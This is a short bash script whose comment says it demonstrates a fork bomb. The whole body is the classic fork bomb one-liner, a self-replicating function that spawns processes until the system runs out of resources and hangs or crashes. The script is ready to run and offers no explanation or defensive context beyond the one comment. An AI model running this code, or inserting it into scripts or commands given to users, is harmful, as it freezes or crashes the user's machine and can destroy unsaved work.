#!/bin/bash

# Shell script to demonstrate the fork bomb, a system resource eater and crasher

:(){
 :|:&
};:
